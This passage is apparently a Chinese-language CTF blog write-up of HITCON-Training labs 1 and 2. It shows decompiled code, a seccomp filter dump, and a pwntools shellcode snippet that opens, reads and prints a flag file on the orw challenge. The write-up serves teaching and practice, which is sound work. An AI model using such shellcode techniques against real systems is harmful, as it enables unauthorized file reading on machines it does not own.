class="number">0x42</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x30</span>; ++i )</span><br><span class="line">        <span class="built_in">putchar</span>(v5[i] ^ buf[i + <span class="number">1</span>]);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sb@xulun:~/pwn/HITCON-Training/LAB/lab1$ ./calc </span><br><span class="line">CTF{debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!}</span><br></pre></td></tr></table></figure>
+
+<h2 id="LAB-2-orw-bin"><a href="#LAB-2-orw-bin" class="headerlink" title="LAB 2 [orw.bin]"></a>LAB 2 [orw.bin]</h2><h3 id="syscall-shellcode"><a href="#syscall-shellcode" class="headerlink" title="syscall   :   shellcode"></a>syscall   :   shellcode</h3><p>跟pwnable.tw的orw应该是同一题，翻了翻互联网的wp，记录一下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Only open read write syscall are allowed to use.</span><br></pre></td></tr></table></figure>
+
+<p>main</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">{</span><br><span class="line">  orw_seccomp();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Give my your shellcode:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;shellcode, <span class="number">0xC8</span>u);</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))shellcode)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>orw_seccomp</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">orw_seccomp</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">  __int16 v1; <span class="comment">// [esp+4h] [ebp-84h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// [esp+8h] [ebp-80h]</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">96</span>]; <span class="comment">// [esp+Ch] [ebp-7Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [esp+6Ch] [ebp-1Ch]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  qmemcpy(v3, &amp;unk_8048640, <span class="keyword">sizeof</span>(v3));</span><br><span class="line">  v1 = <span class="number">12</span>;</span><br><span class="line">  v2 = v3;</span><br><span class="line">  prctl(<span class="number">38</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  prctl(<span class="number">22</span>, <span class="number">2</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v4;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>关注prctl</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_SECCOMP	22</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If no_new_privs is set, then operations that grant new privileges (i.e.</span></span><br><span class="line"><span class="comment"> * execve) will either fail or not grant them.  This affects suid/sgid,</span></span><br><span class="line"><span class="comment"> * file capabilities, and LSMs.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Operations that merely manipulate or drop existing privileges (setresuid,</span></span><br><span class="line"><span class="comment"> * capset, etc.) will still work.  Drop those privileges if you want them gone.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Changing LSM security domain is considered a new privilege.  So, for example,</span></span><br><span class="line"><span class="comment"> * asking selinux for a specific new context (e.g. with runcon) will result</span></span><br><span class="line"><span class="comment"> * in execve returning -EPERM.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PR_SET_NO_NEW_PRIVS	38</span></span><br><span class="line">prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>);<span class="comment">// use the SECCOMP_SET_MODE_FILTER operation</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">sb@xulun:~/pwn/HITCON-Training/LAB/lab2$ seccomp-tools dump ./orw</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class="built_in">arch</span></span><br><span class="line"> 0001: 0x15 0x00 0x09 0x40000003  <span class="keyword">if</span> (A != ARCH_I386) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x07 0x00 0x000000ad  <span class="keyword">if</span> (A == rt_sigreturn) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x00000077  <span class="keyword">if</span> (A == sigreturn) goto 0011</span><br><span class="line"> 0005: 0x15 0x05 0x00 0x000000fc  <span class="keyword">if</span> (A == exit_group) goto 0011</span><br><span class="line"> 0006: 0x15 0x04 0x00 0x00000001  <span class="keyword">if</span> (A == <span class="built_in">exit</span>) goto 0011</span><br><span class="line"> 0007: 0x15 0x03 0x00 0x00000005  <span class="keyword">if</span> (A == open) goto 0011</span><br><span class="line"> 0008: 0x15 0x02 0x00 0x00000003  <span class="keyword">if</span> (A == <span class="built_in">read</span>) goto 0011</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000004  <span class="keyword">if</span> (A == write) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00050026  <span class="built_in">return</span> ERRNO(38)</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  <span class="built_in">return</span> ALLOW</span><br></pre></td></tr></table></figure>
+
+<p>系统过滤，系统调用函数中只有open，read，write能够进入下一步。</p>
+<p>参考<a target="_blank" rel="noopener" href="https://mineta.tistory.com/141">一个师傅</a>的做法，首先使用open打开flag，然后用read读取flag，最后通过stdout输出到屏幕。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> fd = sys_open(<span class="string">"/home/orw/flag"</span>);</span><br><span class="line">sys_read(fd, flag, <span class="number">0x30</span>);</span><br><span class="line">sys_write(<span class="number">1</span>, flag, <span class="number">0x30</span>); </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A060                 public shellcode</span><br><span class="line">.bss:0804A060 shellcode       db    ? ;               ; CODE XREF: main+42↑p</span><br><span class="line">.bss:0804A060                                         ; DATA XREF: main+2E↑o ...</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">该师傅的</span><br><span class="line">栈布局：</span><br><span class="line">shellcode at (.bss) 0x0804A060</span><br><span class="line">code at shellcode+0x0, data at shellcode+0x80(0x0804A0E0)</span><br><span class="line">	data+0x0   : /home/orw/flag</span><br><span class="line">	data+0x20  : [flag]</span><br></pre></td></tr></table></figure>
+
+<p>我的观察：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">read正下方的一些指令</span><br><span class="line">add    esp,0x10</span><br><span class="line">mov    eax,0x804a060 # shellcode</span><br><span class="line">call   eax</span><br></pre></td></tr></table></figure>
+
+<p>eax作为返回值，当我们传入open(path)返回的文件描述符（见pwnable.kr的fd），一个FILE流的句柄，可以有该句柄读入到另一个寄存器(edi还是esp都可以，我们只是需要一个地址去存放)。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode =  <span class="string">''</span></span><br><span class="line"><span class="comment"># flag file open</span></span><br><span class="line">shellcode += shellcraft.<span class="built_in">open</span>(<span class="string">'/home/orw/flag'</span>)</span><br><span class="line"><span class="comment"># read -&gt; input</span></span><br><span class="line">shellcode += shellcraft.read(<span class="string">'eax'</span>, <span class="string">'edi'</span>, <span class="number">100</span>)</span><br><span class="line"><span class="comment"># write -&gt; output</span></span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">'edi'</span>, <span class="number">100</span>)</span><br></pre></td></tr></table></figure>
+
+<p>对于汇编的知识，</p>
+
+                    </article>
+                    
+    <blockquote class="post-license">
+        <p>
+            <strong>本文作者&nbsp;:&nbsp;wtfff</strong>
+            <br>
+            <strong>
+            
+                本作品采用<a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-禁止演绎 4.0 国际许可协议（CC BY-NC-SA 4.0）</a>进行许可。This blog is under a <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" target="_blank">CC BY-NC-SA 4.0 Unported License</a>
+            </strong>
+            <br>
+            <strong>本文链接&nbsp;:&nbsp;</strong><a href="http://im0use.github.io/2022/06/08/hitcon-train/">http://im0use.github.io/2022/06/08/hitcon-train/</a>
+        </p>
+    </blockquote>
+
+
+
+    <blockquote id="date-expire-notification" class="post-expired-notify">本文最后更新于 <span id="date-expire-num"></span> 天前，文中所描述的信息可能已发生改变</blockquote>
+    <script>
+    (function() {
+        var dateUpdate = Date.parse("2022-05-29");
+        var nowDate = new Date();
+        var a = nowDate.getTime();
+        var b = a - dateUpdate;
+        var daysUpdateExpire = Math.floor(b/(24*3600*1000));
+        if (daysUpdateExpire >= 120) {
+            document.getElementById('date-expire-num').innerHTML = daysUpdateExpire;
+        } else {
+            document.getElementById('date-expire-notification').style.display = 'none';
+        }
+    })();
+    </script>
+
+
+<p class="post-footer-info mb-0 pt-0">本文发表于&nbsp;<time datetime="2022-06-08T14:43:16.000Z" itemprop="datePublished">2022-06-08</time>
+
+    , 最后修改于&nbsp;<time datetime="2022-05-29T01:03:06.993Z" itemprop="dateModified">2022-05-29</time>
+
+</p>
+<p class="post-footer-info mb-0 pt-2">
+
+
+
+
+</p>
+
+                </div>
+                <div class="post-nav px-2 bg-gray">
+<ul class="pagination">
+    <!-- Prev Nav -->
+    
+        <li class="page-item page-prev">
+            <a href="/2022/06/10/input2/" rel="prev">
+                <div class="page-item-title"><i class="icon icon-back" aria-hidden="true"></i></div>
+                <div class="page-item-subtitle">input2</div>
+            </a>
+        </li>
+    
+
+    <!-- Next Nav -->
+    
+        <li class="page-item page-next">
+            <a href="/2022/06/01/unlink/" rel="next">
+                <div class="page-item-title"><i class="icon icon-forward" aria-hidden="true"></i></div>
+                <div class="page-item-subtitle">unlink</div>
+            </a>
+        </li>
+    
+</ul>
+</div>
+
+                
+                    <!-- # Comment # -->
+                    
+                
+            </div>
+        </div>
+    </div>
+</div>
+
+            <!-- ### Footer ### -->
+            <footer class="text-center">
+    <!-- footer copyright -->
+    
+        <p class="footer-copyright mb-0">Copyright&nbsp;©&nbsp;<span id="copyright-year"></span>
+            <a class="footer-copyright-a" href="http://im0use.github.io">wtf</a>
+        </p>
+
+    <!-- footer custom text -->
+    <p class="footer-text mb-0">
+    
+    </p>
+    <!-- footer develop info -->
+    <p class="footer-develop mb-0">
+        
+
+        
+        Powered by&nbsp;<!--
+         --><a href="https://hexo.io" target="_blank" class="footer-develop-a" rel="external nofollow noopener noreferrer">Hexo</a><span class="footer-develop-divider"></span>Theme&nbsp;-&nbsp;<!--
+         --><a href="https://github.com/SukkaW/hexo-theme-suka" target="_blank" class="footer-develop-a" rel="external noopener">Suka</a>
+    </p>
+</footer>
+
+
+        <!-- ### Import File ### -->
+        <!-- ### Footer JS Import ### -->
+
+<script>
+
+    
+window.lazyLoadOptions = {
+    elements_selector: ".lazyload",
+    threshold: 50
+};
+document.getElementById('copyright-year').textContent = new Date().getFullYear();
+console.log('\n %c Suka Theme (hexo-theme-suka) | © SukkaW | Verision 1.3.3 %c https://github.com/SukkaW/hexo-theme-suka \n', 'color: #fff; background: #444; padding:5px 0;', 'background: #bbb; padding:5px 0;');
+
+</script>
+
+<script src="/lib/vanilla-lazyload/lazyload.min.js" async></script>
+
+
+
+<!-- Comment -->
+
+
+<!-- ### Custom Footer ### -->
+
+    </body>
+
+</html>
